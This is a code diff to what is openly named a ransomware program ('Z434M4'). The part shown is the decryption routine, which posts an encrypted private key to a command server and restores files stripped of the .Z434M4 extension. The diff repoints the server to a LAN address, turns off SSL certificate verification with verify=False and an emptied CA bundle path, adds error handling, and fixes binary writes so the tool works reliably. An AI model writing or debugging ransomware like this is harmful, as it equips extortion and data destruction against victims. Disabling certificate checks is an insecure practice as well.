@@ -15,6 +15,11 @@ import pickle
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import serialization, hashes
 
+# Fix for SSL certificate issues
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+os.environ['REQUESTS_CA_BUNDLE'] = ''  # Clear the certificate path
+
 logo = """
 ███████╗██╗  ██╗██████╗ ██╗  ██╗███╗   ███╗██╗  ██╗
 ╚══███╔╝██║  ██║╚════██╗██║  ██║████╗ ████║██║  ██║
@@ -35,7 +40,7 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 
 # environment paths
 ransomware_name = ("Z434M4")
-server_address = ("http://localhost:8000")
+server_address = ("http://192.168.8.116:8000/decrypt/")  # Use your PC's actual IP address
 home = environment.get_home_path()
 desktop = environment.get_desktop_path()
 username = environment.get_username()
@@ -86,12 +91,19 @@ def decrypt_aes_keys(enc, key):
 
 def send_to_server_encrypted_private_key(id, private_encrypted_key):
     try:
-        ret = requests.post(server_address, data=private_encrypted_key)
+        print(f"Connecting to server at {server_address}...")
+        # Added verify=False to bypass certificate validation
+        ret = requests.post(server_address, data=private_encrypted_key, verify=False)
+        
+        if ret.status_code != 200:
+            print(f"Server returned error: {ret.status_code} - {ret.text}")
+            raise Exception(f"Server error: {ret.status_code}")
+            
     except Exception as e:
+        print(f"Error connecting to server: {str(e)}")
         raise e
 
-    print("key decrypted")
-
+    print("✓ Key decrypted by server")
     private_key = ret.text
     return str(private_key)
 
@@ -162,7 +174,7 @@ def menu():
 
         # save into new file without .Z434M4 extension
         old_file_name = _[1].replace(".Z434M4", "")
-        with open(old_file_name, 'w') as f:
+        with open(old_file_name, 'wb') as f:
             f.write(decrypted_file_content)
         
         # delete old encrypted file
